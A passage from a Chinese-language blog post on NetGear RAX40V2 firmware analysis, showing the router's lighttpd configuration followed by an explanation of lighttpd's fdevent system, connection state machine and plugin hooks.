class="line">cgi.assign      = (</span><br><span class="line">        &quot;.cgi&quot;  =&gt; &quot;&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">####compress module</span><br><span class="line">compress.allowed-encodings = (&quot;bzip2&quot;, &quot;gzip&quot;, &quot;deflate&quot;)</span><br><span class="line">compress.cache-dir          = &quot;/tmp/cache/lighttpd/compress/&quot;</span><br><span class="line">compress.filetype           = (&quot;text/json&quot;,&quot;text/plain&quot;,&quot;text/css&quot;, &quot;text/xml&quot;, &quot;text/javascript&quot;,&quot;application/javascript&quot;,&quot;application/json&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">###### virtual hosts</span><br><span class="line">##</span><br><span class="line">##   If you want name-based virtual hosting add the next three settings and load</span><br><span class="line">##   mod_simple_vhost</span><br><span class="line">##</span><br><span class="line">## document-root =</span><br><span class="line">##   virtual-server-root + virtual-server-default-host + virtual-server-docroot or</span><br><span class="line">##   virtual-server-root + http-host + virtual-server-docroot</span><br><span class="line">##</span><br><span class="line">#simple-vhost.server-root = &quot;/home/weigon/wwwroot/servers/&quot;</span><br><span class="line">#simple-vhost.default-host = &quot;grisu.home.kneschke.de&quot;</span><br><span class="line">#simple-vhost.document-root = &quot;/pages/&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## </span><br><span class="line">## Format: &lt;errorfile-prefix&gt;&lt;status&gt;.html</span><br><span class="line">## -&gt; ..../status-404.html for &#x27;File not found&#x27;</span><br><span class="line">server.errorfile-prefix = var.VendorPath+&quot;/www/error-&quot;</span><br><span class="line"></span><br><span class="line">## virtual directory listings</span><br><span class="line">#server.dir-listing = &quot;enable&quot;</span><br><span class="line"></span><br><span class="line">## send unhandled HTTP-header headers to error-log</span><br><span class="line">#debug.dump-unknown-headers = &quot;enable&quot;</span><br><span class="line"></span><br><span class="line">### only root can use these options</span><br><span class="line">#</span><br><span class="line"># chroot() to directory (default: no chroot() )</span><br><span class="line">#server.chroot = &quot;/&quot;</span><br><span class="line"></span><br><span class="line">## change uid to &lt;uid&gt; (default: don&#x27;t care)</span><br><span class="line">#server.username = &quot;nobody&quot;</span><br><span class="line">#</span><br><span class="line">server.upload-dirs = ( &quot;/tmp&quot; )</span><br><span class="line"></span><br><span class="line">## change uid to &lt;uid&gt; (default: don&#x27;t care)</span><br><span class="line">#server.groupname = &quot;nobody&quot;</span><br><span class="line"></span><br><span class="line">#### compress module</span><br><span class="line">#compress.cache-dir          = &quot;/dev/null/&quot;</span><br><span class="line">#compress.filetype           = (&quot;text/plain&quot;, &quot;text/html&quot;)</span><br><span class="line"></span><br><span class="line">#### proxy module</span><br><span class="line">## read proxy.txt for more info</span><br><span class="line">#proxy.server = (</span><br><span class="line">#	&quot;.php&quot; =&gt; (</span><br><span class="line">#		&quot;localhost&quot; =&gt; (</span><br><span class="line">#			&quot;host&quot; =&gt; &quot;192.168.0.101&quot;,</span><br><span class="line">#			&quot;port&quot; =&gt; 80</span><br><span class="line">#		)</span><br><span class="line">#	)</span><br><span class="line">#)</span><br><span class="line"></span><br><span class="line">#### fastcgi module</span><br><span class="line">## read fastcgi.txt for more info</span><br><span class="line">#fastcgi.server = (</span><br><span class="line">#	&quot;.php&quot; =&gt; (</span><br><span class="line">#		&quot;localhost&quot; =&gt; (</span><br><span class="line">#			&quot;socket&quot; =&gt; &quot;/tmp/php-fastcgi.socket&quot;,</span><br><span class="line">#			&quot;bin-path&quot; =&gt; &quot;/usr/local/bin/php&quot;</span><br><span class="line">#		)</span><br><span class="line">#	)</span><br><span class="line">#)</span><br><span class="line"></span><br><span class="line">#### CGI module</span><br><span class="line">#cgi.assign = ( &quot;.pl&quot;  =&gt; &quot;/usr/bin/perl&quot;, &quot;.cgi&quot; =&gt; &quot;/usr/bin/perl&quot; )</span><br><span class="line"></span><br><span class="line">#### SSL engine</span><br><span class="line">$SERVER[&quot;socket&quot;] == &quot;:18443&quot; &#123;</span><br><span class="line">server.document-root = var.VendorPath+&quot;/www/&quot;</span><br><span class="line">ssl.engine = &quot;enable&quot;</span><br><span class="line">ssl.pemfile = &quot;/etc/lighttpd/lighttpd.pem&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#### status module</span><br><span class="line">#status.status-url = &quot;/server-status&quot;</span><br><span class="line">#status.config-url = &quot;/server-config&quot;</span><br><span class="line"></span><br><span class="line">#### usertrack module</span><br><span class="line">usertrack.cookie-max-age = 3600</span><br><span class="line">usertrack.cookie-name = &quot;ugwcookie&quot;</span><br><span class="line">usertrack.cookie-attrs = &quot;; Secure; HttpOnly&quot;</span><br><span class="line"></span><br><span class="line">#### auth module</span><br><span class="line">$HTTP[&quot;url&quot;] =~ &quot;&quot; &#123;</span><br><span class="line">auth.backend = &quot;htdigest&quot;</span><br><span class="line">auth.backend.htdigest.userfile = &quot;/etc/lighttpd/lighttpdadmin.user&quot;</span><br><span class="line">        auth.require = (</span><br><span class="line">               &quot;&quot; =&gt; (</span><br><span class="line">                      &quot;method&quot;  =&gt; &quot;digest&quot;,</span><br><span class="line">                      &quot;realm&quot;   =&gt; &quot;auth&quot;,</span><br><span class="line">                      &quot;require&quot; =&gt; &quot;valid-user&quot;</span><br><span class="line"> 	       )</span><br><span class="line">       	)</span><br><span class="line">&#125;</span><br><span class="line">                                                                                                                                        </span><br><span class="line">#$HTTP[&quot;url&quot;] =~ &quot;^/gu/&quot; &#123;</span><br><span class="line">#auth.backend = &quot;htdigest&quot;</span><br><span class="line">#auth.backend.htdigest.userfile = &quot;/etc/lighttpd/lighttpdguest.user&quot;</span><br><span class="line">#        auth.require = (</span><br><span class="line"># 	       &quot;&quot; =&gt; (</span><br><span class="line">#                      &quot;method&quot;  =&gt; &quot;digest&quot;,</span><br><span class="line">#                      &quot;realm&quot;   =&gt; &quot;auth&quot;,</span><br><span class="line">#                      &quot;require&quot; =&gt; &quot;valid-user&quot;</span><br><span class="line"># 	       )</span><br><span class="line">#        )</span><br><span class="line">#&#125;</span><br><span class="line">                                                                                                       </span><br><span class="line">#$HTTP[&quot;url&quot;] =~ &quot;^/usr/&quot; &#123;</span><br><span class="line">#auth.backend = &quot;htdigest&quot;</span><br><span class="line">#auth.backend.htdigest.userfile = &quot;/etc/lighttpd/lighttpduser.user&quot;</span><br><span class="line">#        auth.require = (</span><br><span class="line">#               &quot;&quot; =&gt; (</span><br><span class="line">#                      &quot;method&quot;  =&gt; &quot;digest&quot;,</span><br><span class="line">#                      &quot;realm&quot;   =&gt; &quot;auth&quot;,</span><br><span class="line">#                      &quot;require&quot; =&gt; &quot;valid-user&quot;</span><br><span class="line">#               )</span><br><span class="line">#       )</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line">#$HTTP[&quot;url&quot;] =~ &quot;^/adm/&quot; &#123;</span><br><span class="line">#auth.backend = &quot;htdigest&quot;</span><br><span class="line">#auth.backend.htdigest.userfile = &quot;/etc/lighttpd/lighttpdadmin.user&quot;</span><br><span class="line">#        auth.require = (</span><br><span class="line">#               &quot;&quot; =&gt; (</span><br><span class="line">#                      &quot;method&quot;  =&gt; &quot;digest&quot;,</span><br><span class="line">#                      &quot;realm&quot;   =&gt; &quot;auth&quot;,</span><br><span class="line">#                      &quot;require&quot; =&gt; &quot;valid-user&quot;</span><br><span class="line">#               )</span><br><span class="line">#        )</span><br><span class="line">#&#125;</span><br><span class="line">                                                                                                                                        </span><br><span class="line">$HTTP[&quot;url&quot;] =~ &quot;^/su/&quot; &#123;</span><br><span class="line">auth.backend = &quot;htdigest&quot;</span><br><span class="line">auth.backend.htdigest.userfile = &quot;/etc/lighttpd/lighttpdsuper.user&quot;</span><br><span class="line">        auth.require = (</span><br><span class="line">               &quot;&quot; =&gt; (</span><br><span class="line">                      &quot;method&quot;  =&gt; &quot;digest&quot;,</span><br><span class="line">                      &quot;realm&quot;   =&gt; &quot;auth&quot;,</span><br><span class="line">                      &quot;require&quot; =&gt; &quot;valid-user&quot;</span><br><span class="line">        )</span><br><span class="line">       )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">## read authentification.txt for more info</span><br><span class="line">#auth.backend = &quot;plain&quot;</span><br><span class="line">#auth.backend.plain.userfile = &quot;lighttpd.user&quot;</span><br><span class="line">#auth.backend.plain.groupfile = &quot;lighttpd.group&quot;</span><br><span class="line">#auth.require = (</span><br><span class="line">#	&quot;/server-status&quot; =&gt; ( </span><br><span class="line">#		&quot;method&quot;  =&gt; &quot;digest&quot;,</span><br><span class="line">#		&quot;realm&quot;   =&gt; &quot;download archiv&quot;,</span><br><span class="line">#		&quot;require&quot; =&gt; &quot;group=www|user=jan|host=192.168.2.10&quot;</span><br><span class="line">#	),</span><br><span class="line">#	&quot;/server-info&quot; =&gt; ( </span><br><span class="line">#		&quot;method&quot;  =&gt; &quot;digest&quot;,</span><br><span class="line">#		&quot;realm&quot;   =&gt; &quot;download archiv&quot;,</span><br><span class="line">#		&quot;require&quot; =&gt; &quot;group=www|user=jan|host=192.168.2.10&quot;</span><br><span class="line">#	)</span><br><span class="line">#)</span><br><span class="line"></span><br><span class="line">#### url handling modules (rewrite, redirect, access)</span><br><span class="line">#url.redirect = ( &quot;^/$&quot; =&gt; &quot;/app/&quot; )</span><br><span class="line">#url.redirect = ( &quot;^/wishlist/(.+)&quot; =&gt; &quot;http://www.123.org/$1&quot; )</span><br><span class="line"></span><br><span class="line">#### both rewrite/redirect support back reference to regex conditional using %n</span><br><span class="line">#$HTTP[&quot;host&quot;] =~ &quot;^/$&quot; &#123;</span><br><span class="line">#	url.redirect = ( &quot;^/$&quot; =&gt; &quot;http://%1/app/&quot; )</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line">#### expire module</span><br><span class="line">#expire.url = ( &quot;/buggy/&quot; =&gt; &quot;access 2 hours&quot;, &quot;/asdhas/&quot; =&gt; &quot;access plus 1 seconds 2 minutes&quot;)</span><br><span class="line"></span><br><span class="line">#### ssi</span><br><span class="line">#ssi.extension = ( &quot;.shtml&quot; )</span><br><span class="line"></span><br><span class="line">#### setenv</span><br><span class="line">#setenv.add-request-header  = ( &quot;TRAV_ENV&quot; =&gt; &quot;mysql://user@host/db&quot; )</span><br><span class="line">#setenv.add-response-header = ( &quot;X-Secret-Message&quot; =&gt; &quot;42&quot; )</span><br><span class="line"></span><br><span class="line">#### variable usage:</span><br><span class="line">## variable name without &quot;.&quot; is auto prefixed by &quot;var.&quot; and becomes &quot;var.bar&quot;</span><br><span class="line">#bar = 1</span><br><span class="line">#var.mystring = &quot;foo&quot;</span><br><span class="line"></span><br><span class="line">## integer add</span><br><span class="line">#bar += 1</span><br><span class="line">## string concat, with integer cast as string, result: &quot;www.foo1.com&quot;</span><br><span class="line">#server.name = &quot;www.&quot; + mystring + var.bar + &quot;.com&quot;</span><br><span class="line">## array merge</span><br><span class="line">#index-file.names = (foo + &quot;.php&quot;) + index-file.names</span><br><span class="line">#index-file.names += (foo + &quot;.php&quot;)</span><br><span class="line"></span><br><span class="line">#### include</span><br><span class="line">#include /etc/lighttpd/lighttpd-inc.conf</span><br><span class="line">## same as above if you run: &quot;lighttpd -f /etc/lighttpd/lighttpd.conf&quot;</span><br><span class="line">#include &quot;lighttpd-inc.conf&quot;</span><br><span class="line"></span><br><span class="line">#### include_shell</span><br><span class="line">#include_shell &quot;echo var.a=1&quot;</span><br><span class="line">## the above is same as:</span><br><span class="line">#var.a=1</span><br><span class="line"></span><br><span class="line">#### webdav</span><br><span class="line">#$HTTP[&quot;url&quot;] =~ &quot;^/webdav($|/)&quot; &#123;</span><br><span class="line"># webdav.activate = &quot;enable&quot;</span><br><span class="line"># webdav.is-readonly = &quot;enable&quot;</span><br><span class="line"># webdav.sqlite-db-name = &quot;/var/run/lighttpd-webdav-lock.db&quot;</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line">#### setenv module</span><br><span class="line"></span><br><span class="line">setenv.add-response-header = (</span><br><span class="line"># don&#x27;t allow external content at all </span><br><span class="line">&quot;Content-Security-Policy&quot; =&gt; &quot;script-src &#x27;self&#x27;  &#x27;unsafe-eval&#x27; &#x27;unsafe-inline&#x27; ;&quot;,</span><br><span class="line">#don&#x27;t allow anyone to change the content type</span><br><span class="line">&quot;Content-Type-Options&quot; =&gt; &quot;nosniff&quot;,</span><br><span class="line">#prevent any communications from being sent over HTTP to the specified domain</span><br><span class="line">&quot;Strict-Transport-Security&quot; =&gt; &quot;max-age=31536000;includeSubDomains&quot;,</span><br><span class="line">#stop pages from loading when reflected XSS attacks detected</span><br><span class="line">&quot;X-XSS-Protection&quot; =&gt; &quot;1;mode=block&quot;,</span><br><span class="line">#browser should allow rendering of frame of its in the same origin as the page itself</span><br><span class="line">&quot;X-Frame-Options&quot; =&gt; &quot;SAMEORIGIN&quot;,</span><br><span class="line">#not to use a previously cached response, not to store the response, the cache must be revalidated on the origin server.</span><br><span class="line">&quot;Cache-Control&quot; =&gt; &quot;no-cache,no-store,max-age=0,must-revalidate&quot;,</span><br><span class="line">&quot;Pragma&quot; =&gt; &quot;no-cache&quot;,</span><br><span class="line">&quot;Expires&quot; =&gt; &quot;-1&quot;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>



<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p> 整个程序的入口（main函数）在server.c文件中。</p>
<p><strong>fdevent 系统</strong></p>
<p>lighttpd中的fdevent系统。fdevent系统主要是处理各种IO事件，在web服务器中，主要就是向socket写数据和从socket读数据。通常，web服务器是IO密集型程序，这就要求在数据的读写上，web服务器必须能够具有很好的性能，不会因为某个socket的阻塞而致使其他socket也被阻塞，否则会大大降低服务器的性能。因此，大部分的web服务器都采用非阻塞IO进行数据的读写。lighttpd通过fdevent系统，采用类似OO中面向对象的方式将对IO事件的处理进行封装，对于不同的IO系统，提供一个统一的接口。<br>lighttpd采用了所谓的Reactor模式，也就是非阻塞IO加多路复用（non-blocking IO + IO multiplexing）。在多路复用上，lighttpd通过fdevent将各种不同的实现进行封装</p>
<p><img src="https://pic002.cnblogs.com/img/kernelhcy/201003/2010031717255347.png" alt="img"></p>
<p><strong>状态机处理</strong></p>
<p>（1）connection.c 文件中的函数说明</p>
<p>connection_handle_read_state(server *srv，connection *con) </p>
<p>在这个函数中，如果数据读取完毕或出错，那么进入相应的状态，如果数据没有读取完毕那么连接的状态不变。此函数读取的数据是HTTP头，在这个函数中根据格式HTTP头的格式判断HTTP头是否已经读取完毕，包括POST数据。</p>
<p>connection_set_state()函数</p>
<p>此函数可以将新建立的连接的状态设置为其他的状态。</p>
<p>http_response_prepare 函数中，</p>
<p>通过对url 的解析，逐步调用插件来处理，对解析的uri 的结果存放在 con -&gt; uri 中。</p>
<p><strong>插件接口</strong></p>
<p>plugins_call_handle_uri_raw</p>
<p>在得到http头中，request line的url地址直接调用，此时url地址没有解码</p>
<p>plugins_call_handle_uri_clean</p>
<p>对url 地址进行解码之后调用</p>
<p>plugins_call_handle_docroot</p>
<p>设置处理请求时的根目录</p>
<p>plugins_call_handle_physical</p>
<p>得到请求资源在服务器上的物理地址，根据这个物理地址做相应的处理</p>
<p>plugins_call_handle_subrequest_start</p>
<p>子请求处理开始</p>
<p>plugins_call_handle_subrequest</p>
<p>处理子请求</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kernel_hcy/archive/2010/04/07/1706587.html">https://www.cnblogs.com/kernel_hcy/archive/2010/04/07/1706587.html</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://tig3rhu.github.io/2023/12/16/NetGear_%E5%A4%9C%E9%B9%B0_RAX40V2_%E8%AE%BE%E5%A4%87%E4%B8%8E%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90/" data-id="clq9l1r3u0008ysvbc8i24lxh" data-title="NetGear_夜鹰_RAX40V2_设备与固件分析" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/01/03/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP/">apk逆向__婚礼纪逆向</a>
          </li>
        
          <li>
            <a href="/2024/01/02/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95/">Android各种机型刷机踩坑记录</a>
          </li>
        
          <li>
            <a href="/2024/01/02/65__%E9%80%86%E5%90%91_%E6%87%92%E4%BA%BA%E9%A9%BE%E8%80%83%E9%80%86%E5%90%91/">apk逆向__懒人驾考去会员</a>
          </li>
        
          <li>
            <a href="/2024/01/02/66__%E9%80%86%E5%90%91_%E6%BB%B4%E7%AD%94%E6%B8%85%E5%8D%95%E5%8E%BB%E4%BC%9A%E5%91%98/">apk逆向__滴答清单去会员</a>
          </li>
        
          <li>
            <a href="/2023/12/18/45__%E8%93%9D%E7%89%99%20sniff%20&%20CTF/">蓝牙sniff&amp;CTF&amp;develop</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 Tig3rHu<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>